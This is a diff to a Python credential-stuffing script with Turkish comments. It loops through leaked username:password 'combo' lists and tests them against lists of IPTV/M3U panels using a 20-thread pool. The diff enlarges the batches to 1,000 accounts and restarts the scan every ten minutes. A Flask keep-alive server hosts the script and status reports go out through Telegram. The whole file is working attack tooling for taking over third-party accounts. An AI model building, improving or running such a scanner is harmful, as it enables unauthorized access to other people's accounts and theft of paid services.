@@ -2,13 +2,12 @@ import os
 import time
 import datetime
 import requests
-import urllib3
-from urllib3.exceptions import InsecureRequestWarning
 from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# SSL uyarılarını güvenli şekilde kapat
-urllib3.disable_warnings(InsecureRequestWarning)
+# SSL uyarılarını kapat
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 from flask import Flask
 app = Flask('')
@@ -26,6 +25,7 @@ def telegrama_gonder(mesaj):
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
         res = requests.post(url, data=data, timeout=10)
         
+        # Telegram yanıtını kontrol edelim (Spam veya hata varsa konsola yazdırsın)
         if res.status_code != 200:
             print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}, Cevap: {res.text}")
         else:
@@ -126,7 +126,7 @@ def m3u_tara_detayli(panel, user, pas):
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Canlı Log and Hata İzleme Modu Devrede.")
+    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
@@ -166,7 +166,35 @@ def arka_plan_tarayici():
 
                         print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} panel ile taranıyor...")
                         
-                        chunk_size = 500
+                        chunk_size = 1000
                         toplam_chunk = (len(combolar) + chunk_size - 1) // chunk_size
                         
-                        for idx, i in enumerate(range(0, len(combolar),
+                        for idx, i in enumerate(range(0, len(combolar), chunk_size), 1):
+                            chunk = combolar[i:i + chunk_size]
+                            print(f"[i] İşleniyor: Chunk {idx}/{toplam_chunk} ({len(chunk)} hesap)...")
+                            
+                            with ThreadPoolExecutor(max_workers=20) as executor:
+                                futures = [
+                                    executor.submit(m3u_tara_detayli, panel, user, pas)
+                                    for user, pas in chunk
+                                    for panel in paneller
+                                ]
+                                for future in as_completed(futures):
+                                    pass
+                            
+                            time.sleep(0.5)
+        
+            print("\n[i] Tarama turu tamamlandı, 10 dakika sonra tekrar dönecek...")
+            time.sleep(600)
+        except Exception as e:
+            print(f"[!] Tarama döngüsü hatası: {e}")
+            time.sleep(30)
+
+if __name__ == '__main__':
+    import threading
+    t = threading.Thread(target=arka_plan_tarayici)
+    t.daemon = True
+    t.start()
+    
+    print("[*] Flask Web Sunucusu Başlatılıyor...")
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
